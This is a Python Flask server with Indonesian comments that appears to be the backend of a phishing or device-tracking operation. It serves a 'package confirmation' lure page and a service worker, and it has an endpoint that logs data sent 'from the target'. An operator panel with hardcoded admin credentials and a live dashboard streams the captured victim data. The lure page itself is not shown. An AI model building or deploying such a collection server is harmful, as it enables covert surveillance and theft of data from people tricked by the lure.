import os
from flask import Flask, request, redirect, jsonify
from flask import render_template

app = Flask(__name__)

# Memastikan folder untuk menyimpan data hasil sinkronisasi sudah siap
LOG_FILE = "sinkronisasi_log.txt"

@app.route('/')
def home():
    return "Gear99 Core Server Active", 200

@app.route('/konfirmasi-paket')
def target_page():
    # Mengubah pemanggilan agar membaca dari folder templates bawaan
    return render_template('target.html')


@app.route('/static/sw.js')
def serve_sw():
    return app.send_static_file('sw.js'), 200, {'Content-Type': 'application/javascript'}

# ==========================================
# 1. API ENDPOINT: MENERIMA DATA DARI TARGET
# ==========================================
@app.route('/api/kirim-data', methods=['POST'])
def terima_data():
    try:
        data = request.json
        if data:
            status_perangkat = data.get('status', 'Unknown')
            info_tambahan = data.get('info', 'No details')
            
            # Catat data yang masuk ke dalam file teks di VPS
            with open(LOG_FILE, "a") as f:
                f.write(f"SINKRONISASI AKTIF -> Status: {status_perangkat} | Detail: {info_tambahan}\n")
                
            return jsonify({"status": "success", "message": "Data terikat"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "failed"}), 400

# ==========================================
# 2. API ENDPOINT: MEMBACA LOG UNTUK DASBOR
# ==========================================
@app.route('/api/ambil-log')
def ambil_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            baris = f.readlines()
            # Ambil 10 baris data terakhir agar dasbor tidak penuh
            return jsonify({"logs": baris[-10:]})
    return jsonify({"logs": ["Belum ada aktivitas sinkronisasi yang tercatat..."]})

# ==========================================
# 3. HALAMAN LOGIN OPERATOR
# ==========================================
@app.route('/operator', methods=['GET', 'POST'])
def operator_panel():
    pesan_error = ""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == "admin" and password == "medusa123":
            return redirect('/operator/dashboard')
        else:
            pesan_error = "<p style='color: red;'>Kredensial Salah! Akses Ditolak.</p>"
            
    return f'''
    <html>
        <head><title>Gear99 - Dual Active Operator</title></head>
        <body style="background-color: #0b0c10; color: white; font-family: sans-serif; padding: 50px;">
            <h2>[ GEAR99 LAB AUTH ]</h2>
            {pesan_error}
            <form method="POST" action="/operator">
                <p>Username: <input type="text" name="username" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <p>Password: <input type="password" name="password" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <input type="submit" value="Masuk Panel" style="background: #45f3ff; color: black; border: none; padding: 5px 15px; cursor: pointer;">
            </form>
        </body>
    </html>
    '''

# ==========================================
# 4. HALAMAN DASBOR UTAMA (AUTO-REFRESH LOG)
# ==========================================
@app.route('/operator/dashboard')
def operator_dashboard():
    return '''
    <html>
        <head>
            <title>Gear99 - Main Control Room</title>
            <script>
                // Fungsi untuk mengambil data log dari server setiap 2 detik secara otomatis
                function perbaruiLog() {
                    fetch('/api/ambil-log')
                        .then(response => response.json())
                        .then(data => {
                            let logKontainer = document.getElementById("log-stream");
                            logKontainer.innerHTML = "";
                            data.logs.forEach(log => {
                                let p = document.createElement("p");
                                p.style.margin = "5px 0";
                                p.style.borderBottom = "1px solid #252830";
                                p.style.paddingBottom = "3px";
                                p.innerText = log;
                                logKontainer.appendChild(p);
                            });
                        })
                        .catch(err => console.error("Gagal memuat log:", err));
                }
                
                // Jalankan per pemanggilan berkala
                setInterval(perbaruiLog, 2000);
                window.onload = perbaruiLog;
            </script>
        </head>
        <body style="background-color: #0b0c10; color: #45f3ff; font-family: monospace; padding: 30px;">
            <h2>[ GEAR99 CENTRAL LAB CONTROL - CORE STREAM ]</h2>
            <hr style="border: 1px solid #1f2833;">
            <p style="color: #66fcf1;">Status Server: <span style="color: lightgreen;">ONLINE</span></p>
            <p style="color: #66fcf1;">PWA Service Worker: <span style="color: lightgreen;">BOUND (ACTIVE)</span></p>
            <div style="background: #1f2833; padding: 20px; border-radius: 5px; color: white; min-height: 200px;">
                <strong>[ LOG STREAM DATA INCOMING ]</strong>
                <div id="log-stream" style="margin-top: 15px; color: #a9eed1;">
                    Menghubungkan ke server log...
                </div>
            </div>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
